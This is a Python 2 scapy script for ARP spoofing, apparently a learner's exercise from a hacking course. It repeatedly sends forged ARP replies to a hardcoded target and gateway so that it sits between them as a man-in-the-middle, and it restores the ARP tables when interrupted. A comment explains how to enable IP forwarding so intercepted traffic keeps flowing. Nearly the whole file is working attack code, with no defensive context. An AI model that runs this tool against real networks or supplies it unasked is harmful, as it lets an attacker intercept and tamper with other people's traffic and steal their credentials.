#python 2
# To make your pc a router you need to give the command on terminal
#echo 1 > /proc/sys/net/ipv4/ip_forward
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    #this mac is for broadcast
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
# this line will return 2 lists, answered and unanswered.Timeout will specify time to request
    while True:
        try:
            answered_list = scapy.srp(arp_request_broadcast,timeout=2,verbose=False)[0]#verbose=False for no output on console
            mac = answered_list[0][1].hwsrc
            return mac
        except:
            pass


        #sender Ip address and Mac address which broadcast the broadcast
    # print(answered_list[0][0].pdst)
    # print(answered_list[0][0].hwdst)
# IP & MAC who replied for the packet
#     print(answered_list[0][1].psrc)
#     print(answered_list[0][1].hwsrc)


def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    #op=1 for sending op=2 for receiveing
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.summary())
    # print(packet.show())
    scapy.send(packet,verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst = destination_mac, psrc=source_ip,hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,count=4,verbose=False)


# get_mac("192.168.0.1/24")
target_ip = "192.168.0.101"
gateway_ip = "192.168.0.103"
send_packets_count = 0
try:
    send_packets_count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        send_packets_count = send_packets_count + 2
        # \r means always start from the start of the line
        print("\r[+] Packets sent "+str(send_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRK+C............Resetting ARP tables..... please wait.\n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip, target_ip)
